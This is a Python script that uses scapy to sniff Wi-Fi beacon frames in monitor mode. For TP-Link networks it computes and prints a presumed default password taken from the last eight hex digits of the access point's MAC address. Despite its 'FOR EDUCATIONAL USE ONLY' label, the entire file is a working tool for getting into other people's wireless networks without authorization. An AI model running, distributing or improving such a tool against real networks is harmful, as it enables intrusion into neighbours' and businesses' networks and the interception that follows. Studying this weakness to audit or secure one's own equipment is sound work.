#!/usr/bin/env python3
from collections import namedtuple
from argparse import ArgumentParser
from scapy.sendrecv import sniff
from scapy.layers.dot11 import Dot11

parser = ArgumentParser(description="Python script for trying default passwords for some TP-Link Hotspots",
                        epilog="FOR EDUCATIONAL USE ONLY")
parser.add_argument("-p", "--print-all", help="print all found ssid's", action="store_true")
args = parser.parse_args()

Config = namedtuple("Config", ["timeout", "print_all"])
CONFIG = Config(timeout=30, print_all=args.print_all)

endpoints = {
    # mac_address: [ssid, password]
}


def count_passwords():
    return len(generate_password_list())


def generate_password_list():
    passwords = []
    for endpoint in endpoints.keys():
        password = endpoints[endpoint][1]
        if password:
            passwords.append(password)
    return passwords


def is_tp_link(ssid):
    return ssid.lower().startswith("tp-link")


def get_password(mac_address):
    return mac_address.replace(":", "")[-8:]


def add_endpoint(ssid, mac_address, password=None):
    endpoints[mac_address] = [ssid, password]


def print_endpoint(ssid, mac_address, password=None):
    print(f"\nSSID: {ssid} \nMac Address: {mac_address}")
    if password:
        print(f"Default Password: {password}")


def packet_handler(packet):
    if packet.haslayer(Dot11) and packet.type == 0 and packet.subtype == 8:
        try:
            ssid = packet.info.decode("utf-8")
            mac_address = str(packet.addr2)
            if not endpoints.get(mac_address) and not ssid == "":
                if CONFIG.print_all:
                    print_endpoint(ssid, mac_address)
                if is_tp_link(ssid):
                    password = get_password(mac_address)
                    print_endpoint(ssid, mac_address, password=password)
                    add_endpoint(ssid, mac_address, password=password)
                else:
                    add_endpoint(ssid, mac_address)
        except:
            pass


def main():
    try:
        print(f"Scanning for {CONFIG.timeout}sec...")
        sniff(prn=packet_handler, store=False,
              monitor=True, timeout=CONFIG.timeout)
        print("Finishing up...")
        print(f"Found {len(endpoints)} endpoints")
        print(f"Found {count_passwords()} passwords")
        # print(repr(endpoints))
    except KeyboardInterrupt:
        print("Exiting...")
        exit(0)


if __name__ == "__main__":
    main()
